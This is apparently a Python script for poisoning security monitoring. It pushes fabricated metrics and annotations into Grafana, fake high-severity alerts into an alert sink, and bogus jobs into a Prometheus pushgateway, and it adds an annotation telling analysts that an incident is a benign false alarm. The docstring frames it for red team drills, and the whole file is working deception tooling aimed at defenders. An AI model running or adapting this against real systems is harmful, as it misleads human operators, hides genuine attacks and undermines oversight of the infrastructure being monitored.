import random
import json
import time
import requests
import logging
from typing import List, Dict

logger = logging.getLogger("OperatorMindPoisoning")
logger.setLevel(logging.DEBUG)


# === Templates for Deception Payloads ===

DEFAULT_GRAFANA_METRICS = [
    {"metric": "threat_score", "value": 999, "label": "APT-Saturn"},
    {"metric": "auth_attempts", "value": 404, "label": "GhostUser"},
    {"metric": "packet_loss", "value": 33, "label": "ZebraRouter"},
    {"metric": "cpu_usage", "value": 97, "label": "FakeSensor-9"},
    {"metric": "entropy_shift", "value": 88, "label": "DoppelNode"}
]

DEFAULT_PROMETHEUS_EXPORTERS = [
    {"job": "phantom_api", "up": 1, "fake_metric": "ghost_queries_total", "value": 404},
    {"job": "shadow_agent", "up": 1, "fake_metric": "entropy_drip_rate", "value": 3.14}
]

DEFAULT_ALERT_MESSAGES = [
    "Exfiltration detected via port 53",
    "Lateral movement from beaconed host",
    "Suspicious DNS over HTTPS activity",
    "Mimikatz signature match in memory",
    "C2 call via uncommon User-Agent"
]


# === Grafana Telemetry ===

def inject_fake_grafana_series(dashboard_url: str, token: str, metrics: List[Dict]):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    for metric in metrics:
        payload = {
            "dashboardId": 1,
            "panelId": random.randint(1, 10),
            "time": int(time.time() * 1000),
            "data": [{
                "target": metric["label"],
                "datapoints": [[metric["value"], int(time.time() * 1000)]]
            }]
        }
        try:
            r = requests.post(
                f"{dashboard_url.rstrip('/')}/api/annotations",
                headers=headers,
                data=json.dumps(payload),
                timeout=5
            )
            if r.status_code == 200:
                logger.info(f"[Grafana] Injected metric: {metric}")
            else:
                logger.warning(f"[Grafana] Metric inject failed: {r.status_code}")
        except Exception as e:
            logger.error(f"[Grafana] Inject error: {e}")


# === Fake Alerts ===

def generate_decoy_alerts(alert_sink_url: str, count: int = 5):
    for _ in range(count):
        alert = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "severity": random.choice(["high", "critical"]),
            "source": random.choice(["SIEM", "WAF", "NIDS"]),
            "message": random.choice(DEFAULT_ALERT_MESSAGES)
        }

        try:
            r = requests.post(alert_sink_url, json=alert, timeout=5)
            logger.info(f"[ALERT] Fake alert sent: {alert}")
        except Exception as e:
            logger.error(f"[ALERT] Send error: {e}")


# === Prometheus Injection ===

def clone_telemetry_agents(prometheus_push_url: str):
    for exporter in DEFAULT_PROMETHEUS_EXPORTERS:
        metrics = f"# TYPE {exporter['fake_metric']} counter\n{exporter['fake_metric']} {exporter['value']}\n"
        try:
            r = requests.post(
                f"{prometheus_push_url}/metrics/job/{exporter['job']}",
                data=metrics,
                headers={"Content-Type": "text/plain"},
                timeout=5
            )
            if r.status_code == 202:
                logger.info(f"[Prometheus] Fake job pushed: {exporter['job']}")
            else:
                logger.warning(f"[Prometheus] Push failed: {r.status_code}")
        except Exception as e:
            logger.error(f"[Prometheus] Injection error: {e}")


# === Visual Manipulation ===

def distort_visual_cues(dashboard_url: str, token: str):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    annotation = {
        "dashboardId": 1,
        "panelId": 2,
        "time": int(time.time() * 1000),
        "tags": ["false-positive", "honeypot", "distraction"],
        "text": "Kernel panic detected on honeypot-node-3. Analyst verified: benign false alarm."
    }

    try:
        r = requests.post(
            f"{dashboard_url.rstrip('/')}/api/annotations",
            headers=headers,
            data=json.dumps(annotation),
            timeout=5
        )
        if r.status_code == 200:
            logger.info("[Grafana] Visual decoy injected.")
        else:
            logger.warning(f"[Grafana] Annotation error: {r.status_code}")
    except Exception as e:
        logger.error(f"[Grafana] Visual cue error: {e}")


# === Main Orchestrator ===

def deploy_dashboard_poisoning(
    grafana_url: str,
    grafana_token: str,
    prometheus_url: str,
    alert_sink_url: str,
    metric_payload: List[Dict] = DEFAULT_GRAFANA_METRICS
):
    """
    Full attack sequence: injects metrics, alerts, and annotations to poison operator view.
    Suitable for red team drills and cognitive overload testing.
    """
    logger.info("[MindPoison] Starting dashboard deception sequence")
    try:
        inject_fake_grafana_series(grafana_url, grafana_token, metric_payload)
        generate_decoy_alerts(alert_sink_url)
        clone_telemetry_agents(prometheus_url)
        distort_visual_cues(grafana_url, grafana_token)
    except Exception as e:
        logger.error(f"[MindPoison] Dashboard poisoning failed: {e}")


# === Ritual-compatible alias ===

def inject_dashboard_decoys(grafana_url: str, token: str):
    """
    Shortcut function for recursive ritual chains.
    """
    fake_sink = f"{grafana_url.rstrip('/')}/alert"
    fake_push = f"{grafana_url.rstrip('/')}/push"
    deploy_dashboard_poisoning(
        grafana_url=grafana_url,
        grafana_token=token,
        prometheus_url=fake_push,
        alert_sink_url=fake_sink
    )
